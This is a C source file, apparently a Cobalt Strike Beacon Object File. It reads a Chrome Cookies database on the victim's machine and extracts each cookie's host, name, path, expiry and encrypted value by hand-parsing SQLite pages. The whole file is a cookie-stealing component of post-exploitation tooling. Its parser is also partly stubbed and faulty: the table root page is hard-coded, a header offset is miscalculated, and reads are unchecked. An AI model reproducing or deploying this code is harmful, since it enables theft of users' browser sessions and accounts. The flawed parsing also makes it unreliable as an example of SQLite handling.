/*
 * Minimal SQLite interface for BOF
 * Simplified version for reading Chrome Cookies database
 * 
 * This avoids including full sqlite3.c which is too large for BOF.
 * Instead, we parse the SQLite database format manually.
 */

#include <windows.h>
#include "beacon.h"

// SQLite database header (first 100 bytes)
#define SQLITE_HEADER_SIZE 100
#define SQLITE_PAGE_SIZE_OFFSET 16

// SQLite page types
#define PAGE_TYPE_TABLE_INTERIOR 0x05
#define PAGE_TYPE_TABLE_LEAF     0x0D
#define PAGE_TYPE_INDEX_INTERIOR 0x02
#define PAGE_TYPE_INDEX_LEAF     0x0A

// Varint encoding (SQLite format)
static int read_varint(unsigned char* buf, long long* value) {
    int bytes = 0;
    *value = 0;
    
    for (int i = 0; i < 9; i++) {
        unsigned char byte = buf[i];
        bytes++;
        
        if (i < 8) {
            *value = (*value << 7) | (byte & 0x7F);
            if ((byte & 0x80) == 0) {
                return bytes;
            }
        } else {
            *value = (*value << 8) | byte;
            return bytes;
        }
    }
    
    return bytes;
}

// Simple SQLite database parser
typedef struct {
    unsigned char* data;
    size_t size;
    int pageSize;
} SqliteDb;

typedef struct {
    char host[256];
    char name[256];
    unsigned char encryptedValue[4096];
    size_t encValueLen;
    char path[256];
    long long expiry;
    int isSecure;
} CookieRow;

// Open SQLite database from memory
int sqlite_open_memory(unsigned char* data, size_t size, SqliteDb* db) {
    if (size < SQLITE_HEADER_SIZE) {
        return 0;
    }
    
    // Verify SQLite header
    if (MSVCRT$memcmp(data, "SQLite format 3", 15) != 0) {
        return 0;
    }
    
    // Read page size (bytes 16-17, big-endian)
    int pageSize = (data[16] << 8) | data[17];
    if (pageSize == 1) {
        pageSize = 65536;
    }
    
    db->data = data;
    db->size = size;
    db->pageSize = pageSize;
    
    return 1;
}

// Find table by name (simplified - looks for "cookies" table)
int find_table_root_page(SqliteDb* db) {
    // The sqlite_master table is always at page 1
    // We need to scan it to find the root page of "cookies" table
    // This is a simplified version - full implementation would parse B-tree
    
    // For Chrome cookies, the root page is typically page 2 or 3
    // We'll return a reasonable default
    return 2;
}

// Parse table leaf page and extract cookies
int parse_cookie_page(SqliteDb* db, int pageNum, CookieRow* cookies, int maxCookies, int* count) {
    if (pageNum < 1 || (size_t)(pageNum * db->pageSize) > db->size) {
        return 0;
    }
    
    unsigned char* page = db->data + ((pageNum - 1) * db->pageSize);
    unsigned char pageType = page[0];
    
    if (pageType != PAGE_TYPE_TABLE_LEAF) {
        return 0;
    }
    
    // Read cell count (bytes 3-4)
    int cellCount = (page[3] << 8) | page[4];
    if (cellCount > 1000) cellCount = 1000; // Safety limit
    
    *count = 0;
    
    // Cell pointer array starts at offset 8
    for (int i = 0; i < cellCount && *count < maxCookies; i++) {
        int cellOffset = (page[8 + i*2] << 8) | page[8 + i*2 + 1];
        if (cellOffset >= db->pageSize) continue;
        
        unsigned char* cell = page + cellOffset;
        
        // Read payload size (varint)
        long long payloadSize;
        int varBytes = read_varint(cell, &payloadSize);
        cell += varBytes;
        
        // Read rowid (varint)
        long long rowid;
        varBytes = read_varint(cell, &rowid);
        cell += varBytes;
        
        // Parse record header
        long long headerSize;
        varBytes = read_varint(cell, &headerSize);
        cell += varBytes;
        
        // Read serial types for each column
        long long serialTypes[20];
        int numColumns = 0;
        unsigned char* headerEnd = cell + headerSize - varBytes;
        
        while (cell < headerEnd && numColumns < 20) {
            varBytes = read_varint(cell, &serialTypes[numColumns]);
            cell += varBytes;
            numColumns++;
        }
        
        // Chrome cookies table has these columns:
        // 0: creation_utc (int)
        // 1: host_key (text)
        // 2: name (text)
        // 3: value (text)
        // 4: path (text)
        // 5: expires_utc (int)
        // 6: is_secure (int)
        // 7: is_httponly (int)
        // 8: last_access_utc (int)
        // 9: has_expires (int)
        // 10: is_persistent (int)
        // 11: priority (int)
        // 12: encrypted_value (blob)
        // 13: samesite (int)
        // 14: source_scheme (int)
        // 15: source_port (int)
        // 16: is_same_party (int)
        
        // We need: host_key(1), name(2), encrypted_value(12), path(4), expires_utc(5), is_secure(6)
        
        // Skip to actual data (after header)
        cell = headerEnd;
        
        CookieRow* cookie = &cookies[*count];
        MSVCRT$memset(cookie, 0, sizeof(CookieRow));
        
        // Parse columns based on serial types
        for (int col = 0; col < numColumns && col < 17; col++) {
            long long type = serialTypes[col];
            
            if (type == 0) {
                // NULL
                continue;
            } else if (type >= 1 && type <= 6) {
                // Integer
                long long value = 0;
                int bytes = (type == 1) ? 1 : (type == 2) ? 2 : (type == 3) ? 3 :
                           (type == 4) ? 4 : (type == 5) ? 6 : 8;
                
                for (int b = 0; b < bytes; b++) {
                    value = (value << 8) | *cell++;
                }
                
                if (col == 5) cookie->expiry = value;        // expires_utc
                else if (col == 6) cookie->isSecure = (int)value; // is_secure
            } else if (type >= 13 && (type % 2) == 1) {
                // Text (UTF-8)
                int len = (int)((type - 13) / 2);
                
                if (col == 1 && len < 256) {
                    // host_key
                    MSVCRT$memcpy(cookie->host, cell, len);
                    cookie->host[len] = '\0';
                } else if (col == 2 && len < 256) {
                    // name
                    MSVCRT$memcpy(cookie->name, cell, len);
                    cookie->name[len] = '\0';
                } else if (col == 4 && len < 256) {
                    // path
                    MSVCRT$memcpy(cookie->path, cell, len);
                    cookie->path[len] = '\0';
                }
                
                cell += len;
            } else if (type >= 12 && (type % 2) == 0) {
                // Blob
                int len = (int)((type - 12) / 2);
                
                if (col == 12 && len < 4096) {
                    // encrypted_value
                    MSVCRT$memcpy(cookie->encryptedValue, cell, len);
                    cookie->encValueLen = len;
                }
                
                cell += len;
            }
        }
        
        // Only add cookie if we got the essential fields
        if (cookie->host[0] && cookie->name[0] && cookie->encValueLen > 0) {
            (*count)++;
        }
    }
    
    return 1;
}

// Main function to extract cookies from database file
int extract_cookies_from_db(const char* dbPath, CookieRow* cookies, int maxCookies, int* count) {
    HANDLE hFile = KERNEL32$CreateFileA(dbPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                                        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    
    if (hFile == INVALID_HANDLE_VALUE) {
        return 0;
    }
    
    DWORD fileSize = KERNEL32$GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize > 100 * 1024 * 1024) { // 100MB limit
        KERNEL32$CloseHandle(hFile);
        return 0;
    }
    
    unsigned char* dbData = (unsigned char*)MSVCRT$malloc(fileSize);
    if (!dbData) {
        KERNEL32$CloseHandle(hFile);
        return 0;
    }
    
    DWORD bytesRead;
    if (!KERNEL32$ReadFile(hFile, dbData, fileSize, &bytesRead, NULL)) {
        MSVCRT$free(dbData);
        KERNEL32$CloseHandle(hFile);
        return 0;
    }
    
    KERNEL32$CloseHandle(hFile);
    
    SqliteDb db;
    if (!sqlite_open_memory(dbData, bytesRead, &db)) {
        MSVCRT$free(dbData);
        return 0;
    }
    
    int rootPage = find_table_root_page(&db);
    int success = parse_cookie_page(&db, rootPage, cookies, maxCookies, count);
    
    MSVCRT$free(dbData);
    return success;
}